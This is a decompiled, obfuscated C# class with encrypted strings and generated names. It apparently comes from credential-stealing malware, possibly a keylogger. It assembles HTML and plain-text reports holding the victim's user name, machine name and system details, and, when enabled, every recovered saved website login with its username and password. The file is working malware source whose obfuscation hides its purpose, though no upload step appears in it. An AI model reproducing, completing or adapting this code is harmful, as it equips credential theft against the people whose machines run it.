using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;

internal class Class19
{
	public class Class20
	{
		private string string_0;

		private bool bool_0;

		internal string String_0
		{
			get
			{
				return string_0;
			}
			set
			{
				string_0 = value;
			}
		}

		internal bool Boolean_0
		{
			get
			{
				return bool_0;
			}
			set
			{
				bool_0 = value;
			}
		}
	}

	public static string smethod_0(Class20 class20_0)
	{
		StringBuilder stringBuilder_ = new StringBuilder();
		stringBuilder_.Append(_003CModule_003E.smethod_0("횸훠훭훲횤훷훰훽훨훡횹횦훢훫훪훰횩훢훥훩훭훨훽횾훒훡훶훠훥훪훥효횤훃훡훪훡훲훥효횤훷훥훪훷횩훷훡훶훭훢횿횤훦훫훶훠훡훶횩훧훫훨훫훶횾횧훇훇훇횿횤훦훫훶훠훡훶횩훳훭훠훰훬횾훰훬훭훪횿횤훦훫훶훠훡훶횩훷훰훽훨훡횾훷훫훨훭훠횿횦횺", 710276));
		stringBuilder_.Append(_003CModule_003E.smethod_0("鞕韍韀韟鞉韚韝韐韅韌鞔鞋韏韆韇韝鞄韏韈韄韀韅韐鞓響韌韛韍韈韇韈鞅鞉韮韌韇韌韟韈鞅鞉韚韈韇韚鞄韚韌韛韀韏鞒鞉韝韌韑韝鞄韈韅韀韎韇鞓韊韌韇韝韌韛鞒鞉韏韆韇韝鞄韚韀韓韌鞓鞘鞟韙韑鞒韏韆韇韝鞄韞韌韀韎韁韝鞓鞜鞙鞙鞒鞉韊韆韅韆韛鞓鞊鞟鞟鞟鞒鞋鞗鞕韏韆韇韝鞉韚韀韓韌鞔鞋鞂鞟鞋鞗韻韀韇鞉韥韆韎韎韌韛鞕鞆韏韆韇韝鞗鞕韋韛鞉鞆鞗鞕韜韅鞗鞕韜韅鞗鞕韜韅鞗鞕韜韅鞗鞕韜韅鞗鞕韜韅鞗韒鞉韨韜韝韜韄韇鞉韬韍韀韝韀韆韇鞉韔鞕鞆韜韅鞗鞕鞆韜韅鞗鞕鞆韜韅鞗鞕鞆韜韅鞗鞕鞆韜韅鞗鞕鞆韜韅鞗鞕鞆韍韀韟鞗", 300969));
		stringBuilder_.Append(string.Format(_003CModule_003E.smethod_0("\ue09a\ue0d3\ue0ca\ue098\ue09a\ue0c2\ue0cf\ue0d0\ue098\ue09a\ue0c0\ue0c9\ue0c8\ue0d2\ue086\ue0c5\ue0c9\ue0ca\ue0c9\ue0d4\ue09b\ue084\ue085\ue090\ue090\ue090\ue084\ue098\ue0ea\ue0c9\ue0c1\ue0c1\ue0c3\ue0c2\ue086\ue0e9\ue0c8\ue086\ue0dd\ue096\ue0db\ue09a\ue089\ue0c0\ue0c9\ue0c8\ue0d2\ue098\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue098\ue0f3\ue0d5\ue0c3\ue0d4\ue0c8\ue0c7\ue0cb\ue0c3\ue09c\ue09a\ue089\ue0c4\ue098\ue086\ue0dd\ue097\ue0db\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue098\ue0eb\ue0c7\ue0c5\ue0ce\ue0cf\ue0c8\ue0c3\ue09c\ue09a\ue089\ue0c4\ue098\ue086\ue0dd\ue094\ue0db\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue098\ue0e5\ue0c9\ue0d3\ue0c8\ue0d2\ue0d4\ue0df\ue09c\ue09a\ue089\ue0c4\ue098\ue086\ue0dd\ue095\ue0db\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue098\ue0ef\ue0f6\ue086\ue0e7\ue0c2\ue0c2\ue0d4\ue0c3\ue0d5\ue0d5\ue09c\ue09a\ue089\ue0c4\ue098\ue086\ue0dd\ue092\ue0db\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue098\ue0e9\ue0f5\ue086\ue0f0\ue0c3\ue0d4\ue0d5\ue0cf\ue0c9\ue0c8\ue09c\ue09a\ue089\ue0c4\ue098\ue086\ue0dd\ue093\ue0db\ue086\ue08e\ue0dd\ue090\ue0db\ue08f\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue098\ue0e9\ue0f5\ue086\ue0f4\ue0e7\ue0eb\ue09c\ue09a\ue089\ue0c4\ue098\ue086\ue0dd\ue091\ue0db\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue098\ue0e9\ue0f5\ue086\ue0f5\ue0c3\ue0d4\ue0cf\ue0c7\ue0ca\ue086\ue0e8\ue0d3\ue0cb\ue0c4\ue0c3\ue0d4\ue09c\ue09a\ue089\ue0c4\ue098\ue086\ue0dd\ue09e\ue0db\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue0d4\ue086\ue089\ue098\ue09a\ue0c4\ue0d4\ue086\ue089\ue098", 123046), Class12.smethod_8(), Environment.UserName, Environment.MachineName, Class12.smethod_11(), Class12.smethod_4(), Class12.smethod_16(), Class12.smethod_18(), Class12.smethod_17().ToString().Remove(Class12.smethod_17().ToString().Length - 6) + _003CModule_003E.smethod_0("膁臬臣", 950689), Class12.smethod_19()));
		if (class20_0.Boolean_0)
		{
			stringBuilder_.Append(_003CModule_003E.smethod_0("㑛㐅㑙㐪㐈㐝㐎㐋㐋㐆㑇㐡㐎㐕㐂㐁㐈㐟㑛㑈㐅㑙", 144487));
			List<Class18> list = Class21.smethod_0();
			if (list.Count == 0)
			{
				stringBuilder_.Append(_003CModule_003E.smethod_0("՟ԁԑՃՌ՝՟ԁԑՃՌ՝՟ԁ՝ԭԌԍԆ՟Ռԁ՝", 394595));
			}
			else
			{
				smethod_1(ref stringBuilder_);
			}
		}
		Regex regex = new Regex(_003CModule_003E.smethod_0("\u20f1\u20f6\u20f9\u20c4\u20d9\u20c1\u20c8ₗ₍₃\u20d6\u209d₁ₜ\u209d\u209d\u20d0\u20ed₃\u20d6\u209d₁\u209e\u209d\u20d0\u20f1\u20f0", 73901));
		foreach (Match item in regex.Matches(class20_0.String_0))
		{
			class20_0.String_0 = class20_0.String_0.Replace(item.ToString(), _003CModule_003E.smethod_0("뚑뛞뛝뛌뛃뚍뛞뛙뛔뛁뛈뚐뚏뛏뛌뛎뛆뛊뛟뛂뛘뛃뛉뚀뛎뛂뛁뛂뛟뚗뚎뚝뛮뛫뚖뚍뛎뛂뛁뛂뛟뚗뚎뛫뛫뛫뚖뚍뛏뛂뛟뛉뛈뛟뚀뛎뛂뛁뛂뛟뚗뚎뚝뚝뚝뚖뚍뛏뛂뛟뛉뛈뛟뚀뛞뛙뛔뛁뛈뚗뛞뛂뛁뛄뛉뚖뚍뛏뛂뛟뛉뛈뛟뚀뛚뛄뛉뛙뛅뚗뛙뛅뛄뛃뚖뚏뚓", 46765) + item.ToString() + _003CModule_003E.smethod_0("◻◨▴▷▦▩◹", 533959));
		}
		Regex regex2 = new Regex(_003CModule_003E.smethod_0("쿤쿣쾖쿃쾉쾔쾉쾈쿅쾇쿤쿥", 905144));
		foreach (Match item2 in regex2.Matches(class20_0.String_0))
		{
			class20_0.String_0 = class20_0.String_0.Replace(item2.ToString(), _003CModule_003E.smethod_0("抌拃拀拑拞抐拃拄拉拜拕抍抒拒拑拓招拗拂拟担拞拔抝拓拟拜拟拂把抓技拶抉抋抐拓拟拜拟拂把抓拶拶拶抋抒抎", 942768) + item2.ToString() + _003CModule_003E.smethod_0("톓톀퇜퇟퇎퇁톑", 840111));
		}
		class20_0.String_0 = class20_0.String_0.Replace(Environment.NewLine, _003CModule_003E.smethod_0("禝秃秓禁禎禟", 555425));
		stringBuilder_.AppendLine(class20_0.String_0);
		stringBuilder_.Append(_003CModule_003E.smethod_0("絶絥紮紣紼絴絶絥紿紦絴", 163146));
		stringBuilder_.Append(_003CModule_003E.smethod_0("䄚䄉䅂䅏䅐䄘", 606502));
		return stringBuilder_.ToString();
	}

	private static void smethod_1(ref StringBuilder stringBuilder_0)
	{
		foreach (Class18 item in Class21.smethod_0())
		{
			stringBuilder_0.Append($"<br /><br /><b>Website:</b> {item.String_2}<br /><b>Username:</b> {item.String_0}<br /><b>Password:</b> {item.String_1}");
		}
	}

	public static string smethod_2(Class20 class20_0)
	{
		StringBuilder stringBuilder_ = new StringBuilder();
		stringBuilder_.AppendLine(_003CModule_003E.smethod_0("\ue527\ue51c\ue51b\ue555\ue539\ue51a\ue512\ue512\ue510\ue507\ue555\ue50e\ue555\ue534\ue500\ue501\ue500\ue518\ue51b\ue555\ue530\ue511\ue51c\ue501\ue51c\ue51a\ue51b\ue555\ue508", 58741));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("䶝䷛䷸䷰䷰䷲䷳䶷䷘䷹䶷䷬䶧䷪", 806295), Class12.smethod_8()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("\uebaf\uebf0\uebd6\uebc0\uebd7\uebcb\uebc4\uebc8\uebc0\ueb9f\ueb85\uebde\ueb95\uebd8", 584613), Environment.UserName));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("ᖫᖇᖅᖎᖏᖈᖃᗜᗆᖝᗖᖛ", 464358), Environment.MachineName));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("푔푍퐽표푹푹푯푸푮푮퐧퐽푦퐭푠", 709661), Class12.smethod_4()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("稳究穪稙穯穜穋穊穐穖穗稃稙穂稉穄稙稑穂稈穄稐", 358969), Class12.smethod_16(), Class12.smethod_18()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("겘겄곷겅겖겚곭곷견곧겪곷견곦겪", 44247), Class12.smethod_17().ToString().Remove(Class12.smethod_17().ToString().Length - 6), _003CModule_003E.smethod_0("팼팳팂", 643953)));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("⏏⏓⎠⏓⏥⏲⏩⏡⏬⎠⏎⏵⏭⏢⏥⏲⎺⎠⏻⎰⏽", 598912), Class12.smethod_19()));
		stringBuilder_.AppendLine();
		if (class20_0.Boolean_0)
		{
			stringBuilder_.AppendLine(_003CModule_003E.smethod_0("蜠蜂蜗蜄蜁蜁蜌蝍蜫蜄蜟蜈蜋蜂蜕", 558957));
			stringBuilder_.AppendLine();
			List<Class18> list = Class21.smethod_0();
			if (list.Count == 0)
			{
				stringBuilder_.AppendLine(_003CModule_003E.smethod_0("諏諮諯諤", 363137));
			}
			else
			{
				smethod_3(ref stringBuilder_);
			}
		}
		stringBuilder_.AppendLine(class20_0.String_0);
		return stringBuilder_.ToString();
	}

	private static void smethod_3(ref StringBuilder stringBuilder_0)
	{
		foreach (Class18 item in Class21.smethod_0())
		{
			stringBuilder_0.AppendLine(string.Format("Website: {0} {3}Username: {1} {3}Password:{2}", item.String_2, item.String_0, item.String_1, Environment.NewLine));
			stringBuilder_0.AppendLine();
		}
	}
}
